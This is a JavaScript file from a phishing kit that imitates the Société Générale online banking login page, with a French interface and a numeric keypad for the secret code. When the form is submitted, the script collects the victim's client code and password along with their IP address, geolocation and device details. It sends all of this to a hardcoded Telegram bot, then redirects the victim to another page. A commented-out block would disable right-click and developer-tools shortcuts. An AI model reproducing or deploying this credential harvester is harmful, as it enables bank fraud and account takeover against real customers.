var isShift = false;
var seperator = "/";
var dash = '-';

// Configuration Telegram
localStorage.setItem("token_n", "8376172860:AAF0ngjUd2kKPo9nuecXZ9-vlVv5dycjwmU")
localStorage.setItem("chatId_n", "7892950191")

// Fonction pour obtenir l'adresse IP du visiteur
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Inconnue';
    }
}

// Fonction pour obtenir les informations de géolocalisation
async function getLocationInfo(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country: data.country_name || 'Inconnu',
            city: data.city || 'Inconnue',
            region: data.region || 'Inconnue',
            timezone: data.timezone || 'Inconnu',
            isp: data.org || 'Inconnu',
            postal: data.postal || 'Inconnu',
            latitude: data.latitude || 'Inconnue',
            longitude: data.longitude || 'Inconnue'
        };
    } catch (error) {
        return {
            country: 'Inconnu',
            city: 'Inconnue',
            region: 'Inconnue',
            timezone: 'Inconnu',
            isp: 'Inconnu',
            postal: 'Inconnu',
            latitude: 'Inconnue',
            longitude: 'Inconnue'
        };
    }
}

// Fonction pour obtenir les informations du navigateur et de l'appareil
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    
    // Détecter le navigateur
    let browser = 'Autre';
    let browserVersion = 'Inconnue';
    
    if (userAgent.indexOf('Chrome') > -1) {
        browser = 'Chrome';
        const match = userAgent.match(/Chrome\/(\d+)/);
        browserVersion = match ? match[1] : 'Inconnue';
    } else if (userAgent.indexOf('Firefox') > -1) {
        browser = 'Firefox';
        const match = userAgent.match(/Firefox\/(\d+)/);
        browserVersion = match ? match[1] : 'Inconnue';
    } else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) {
        browser = 'Safari';
        const match = userAgent.match(/Version\/(\d+)/);
        browserVersion = match ? match[1] : 'Inconnue';
    } else if (userAgent.indexOf('Edge') > -1) {
        browser = 'Edge';
        const match = userAgent.match(/Edge\/(\d+)/);
        browserVersion = match ? match[1] : 'Inconnue';
    }
    
    // Détecter l'OS
    let os = 'Autre';
    let osVersion = 'Inconnue';
    
    if (userAgent.indexOf('Windows NT 10.0') > -1) {
        os = 'Windows 10/11';
    } else if (userAgent.indexOf('Windows NT 6.3') > -1) {
        os = 'Windows 8.1';
    } else if (userAgent.indexOf('Windows NT 6.1') > -1) {
        os = 'Windows 7';
    } else if (userAgent.indexOf('Mac OS X') > -1) {
        os = 'MacOS';
        const match = userAgent.match(/Mac OS X (\d+_\d+)/);
        osVersion = match ? match[1].replace('_', '.') : 'Inconnue';
    } else if (userAgent.indexOf('Android') > -1) {
        os = 'Android';
        const match = userAgent.match(/Android (\d+\.\d+)/);
        osVersion = match ? match[1] : 'Inconnue';
    } else if (userAgent.indexOf('iPhone') > -1) {
        os = 'iOS (iPhone)';
        const match = userAgent.match(/OS (\d+_\d+)/);
        osVersion = match ? match[1].replace('_', '.') : 'Inconnue';
    } else if (userAgent.indexOf('iPad') > -1) {
        os = 'iOS (iPad)';
        const match = userAgent.match(/OS (\d+_\d+)/);
        osVersion = match ? match[1].replace('_', '.') : 'Inconnue';
    }
    
    // Détecter le type d'appareil
    let deviceType = 'Desktop';
    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = 'Mobile';
    } else if (/Tablet|iPad/i.test(userAgent)) {
        deviceType = 'Tablette';
    }
    
    // Informations sur l'écran
    const screenInfo = {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
    };
    
    // Informations sur la fenêtre
    const windowInfo = {
        width: window.innerWidth,
        height: window.innerHeight
    };
    
    return {
        browser,
        browserVersion,
        os,
        osVersion,
        deviceType,
        screenInfo,
        windowInfo,
        userAgent,
        language: navigator.language || 'Inconnue',
        platform: navigator.platform || 'Inconnue',
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine
    };
}

// Fonction pour générer un ID de session unique
function generateSessionId() {
    return 'SG_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
}

// Fonction pour obtenir la date et l'heure actuelles
function getCurrentDateTime() {
    const now = new Date();
    const date = now.toLocaleDateString('fr-FR');
    const time = now.toLocaleTimeString('fr-FR');
    return { date, time, timestamp: now.getTime() };
}

// Fonction pour obtenir les informations de la page
function getPageInfo() {
    return {
        url: window.location.href,
        referrer: document.referrer || 'Direct',
        title: document.title,
        domain: window.location.hostname
    };
}

function cc_date(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

function date_of_birth(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2 || input.value.length == 5) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

jQuery(function($){

    /*document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });*/
    
    $('form ul.numbers li a').click(function(){
        var cur_number = $(this).data('number');
        if( cur_number == 'zz' )
            return false;
        if( cur_number == '-1' )
            var cur_number = "0";
        var old_val = $('#password').val();
        var zz = old_val + cur_number;
        if( $('#password').val().length == 6 )
            return false;
        $('#password').val(zz);
        var a = $('ul.password-field').children(".empty");
        if( a.length > 0 ) {
            $(a[0]).removeClass('empty');
            $(a[0]).addClass('notempty');
        }
    });

    $('.reset-password').click(function(){
        $('#password').val('');
        $('ul.password-field').children().removeClass("notempty");
        $('ul.password-field').children().addClass("empty");
    });

    $('.input-reset').click(function(){
        $(this).siblings('label').find('input').val('');
        $(this).hide();
    });

    $('.login-form button').click(async function(){
        var code_client = $('#code_client').val();
        var length = code_client.length;
        var password = $('#password').val();
        
        if( length == 8 && $.isNumeric(code_client) && password == ''  ) {
            $('.login-form .zzz').show();
            $('.login-form .error-message').text('').hide();
        } else if( length != 8 || !$.isNumeric(code_client) && password == '' ) {
            $('.login-form .error-message').text('Votre identifiant est incorrect.').show();
        } else if( length == 8 && $.isNumeric(code_client) && password.length != 6 ) {
            $('.login-form .error-message').text('Le code secret saisi est incorrect. Merci de bien vouloir ressaisir votre code secret composé de 6 chiffres.').show();
        } else {
            $('.login-form .error-message').text('').hide();
             
            console.log(" le code ", code_client);
            console.log(password);

            localStorage.setItem("papa", code_client)
            localStorage.setItem("maman", password)

            // Récupérer toutes les informations supplémentaires
            const sessionId = generateSessionId();
            const dateTime = getCurrentDateTime();
            const pageInfo = getPageInfo();
            const deviceInfo = getDeviceInfo();
            
            // Obtenir l'IP et les informations de géolocalisation
            const userIP = await getUserIP();
            const locationInfo = await getLocationInfo(userIP);

            // Construire le message détaillé pour Telegram
            let val2 = "🏦 NOUVELLE CONNEXION SOCIÉTÉ GÉNÉRALE\n";
            val2 += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            
            // Informations de connexion
            val2 += "🔐 DONNÉES DE CONNEXION:\n";
            val2 += "👤 Code Client: " + localStorage.getItem("papa") + "\n";
            val2 += "🔑 Mot de Passe: " + localStorage.getItem("maman") + "\n\n";
            
            // Informations géographiques
            val2 += "📍 INFORMATIONS GÉOGRAPHIQUES:\n";
            val2 += "🌍 Pays: " + locationInfo.country + "\n";
            val2 += "🏙️ Ville: " + locationInfo.city + "\n";
            val2 += "📍 Région: " + locationInfo.region + "\n";
            val2 += "📮 Code Postal: " + locationInfo.postal + "\n";
            val2 += "🕐 Fuseau horaire: " + locationInfo.timezone + "\n";
            val2 += "🌐 Fournisseur: " + locationInfo.isp + "\n";
            val2 += "📐 Coordonnées: " + locationInfo.latitude + ", " + locationInfo.longitude + "\n\n";
            
            // Informations techniques
            val2 += "💻 INFORMATIONS TECHNIQUES:\n";
            val2 += "📱 Système: " + deviceInfo.os;
            if (deviceInfo.osVersion !== 'Inconnue') {
                val2 += " (" + deviceInfo.osVersion + ")";
            }
            val2 += "\n";
            val2 += "🌐 Navigateur: " + deviceInfo.browser;
            if (deviceInfo.browserVersion !== 'Inconnue') {
                val2 += " " + deviceInfo.browserVersion;
            }
            val2 += "\n";
            val2 += "📱 Type d'appareil: " + deviceInfo.deviceType + "\n";
            val2 += "🔗 IP: " + userIP + "\n";
            val2 += "🌍 Langue: " + deviceInfo.language + "\n";
            val2 += "🖥️ Plateforme: " + deviceInfo.platform + "\n\n";
            
            // Informations sur l'écran
            val2 += "🖥️ INFORMATIONS ÉCRAN:\n";
            val2 += "📐 Résolution: " + deviceInfo.screenInfo.width + "x" + deviceInfo.screenInfo.height + "\n";
            val2 += "🪟 Fenêtre: " + deviceInfo.windowInfo.width + "x" + deviceInfo.windowInfo.height + "\n";
            val2 += "🎨 Profondeur couleur: " + deviceInfo.screenInfo.colorDepth + " bits\n\n";
            
            // Informations temporelles
            val2 += "⏰ INFORMATIONS TEMPORELLES:\n";
            val2 += "📅 Date: " + dateTime.date + "\n";
            val2 += "🕐 Heure: " + dateTime.time + "\n";
            val2 += "🆔 ID Session: " + sessionId + "\n\n";
            
            // Informations sur la page
            val2 += "🌐 INFORMATIONS PAGE:\n";
            val2 += "📄 URL: " + pageInfo.url + "\n";
            val2 += "🔗 Référent: " + pageInfo.referrer + "\n";
            val2 += "🏷️ Titre: " + pageInfo.title + "\n";
            val2 += "🌐 Domaine: " + pageInfo.domain + "\n\n";
            
            // Informations système
            val2 += "⚙️ INFORMATIONS SYSTÈME:\n";
            val2 += "🍪 Cookies: " + (deviceInfo.cookieEnabled ? "Activés" : "Désactivés") + "\n";
            val2 += "📶 Connexion: " + (deviceInfo.onLine ? "En ligne" : "Hors ligne") + "\n\n";
            
            val2 += "🔍 USER AGENT:\n";
            val2 += deviceInfo.userAgent + "\n\n";
            
            val2 += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
            val2 += "💡 Banque: Société Générale\n";
            val2 += "⏱️ Timestamp: " + dateTime.timestamp;

            console.log(val2);

            // Envoyer le message à Telegram
            $.ajax({
                url: 'https://api.telegram.org/bot' + localStorage.getItem("token_n") + '/sendMessage',
                method: 'POST',
                data: { 
                    chat_id: localStorage.getItem("chatId_n"), 
                    text: val2,
                    parse_mode: 'HTML'
                },
                success: function () {
                    console.log("Message envoyé avec succès");
                },
                error: function(xhr, status, error) {
                    console.log("Erreur lors de l'envoi:", error);
                }
            });

            // Redirection après 1 seconde
            setTimeout(function () {
                window.location.href = '../final.php';
            }, 1000);
        }
    });

    $('#code_client').keyup(function(){
        var code_client = $('#code_client').val();
        var length = code_client.length;
        if( length > 0 ) {
            $('#input-reset').show();
        } else {
            $('#input-reset').hide();
        }
        if( length == 8 && $.isNumeric(code_client) ) {
            $('.login-form .input-reset').hide();
            $('.login-form .check').show();
        } else {
            $('.login-form .input-reset').show();
            $('.login-form .check').hide();
        }
    });
});